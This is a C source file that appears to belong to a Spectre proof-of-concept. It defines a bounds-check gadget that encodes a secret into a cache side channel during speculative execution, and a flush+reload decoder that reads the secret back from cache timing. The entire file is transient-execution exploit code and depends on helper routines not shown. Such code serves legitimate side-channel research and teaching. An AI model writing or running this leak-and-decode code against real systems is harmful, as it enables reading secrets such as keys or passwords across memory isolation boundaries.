#include "../include/spectre.h"

// returns true during the training phase, false if encoding can only happen transiently
bool leak_data_flush_reload(uint32_t iteration, uint32_t *train_data,
                            uint32_t train_data_len, uint64_t secret, uint8_t channel[],
                            uint8_t bits_count, uint64_t stride)
{
    if (train_data[iteration] < train_data_len)
    {
        asm_encode_data(secret, channel, bits_count, stride);
        return true;
    }
    return false;
}

uint64_t decode_flush_reload(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold)
{
    uint64_t out = 0;
    for (uint32_t i = 1; i < bits_count + 1; i++)
    {
        if (is_cached((side_channel) + (i * stride), threshold))
        {
            out += DOUBLE_TIMES(1, (i - 1) % 8);
        }
    }
    return out;
}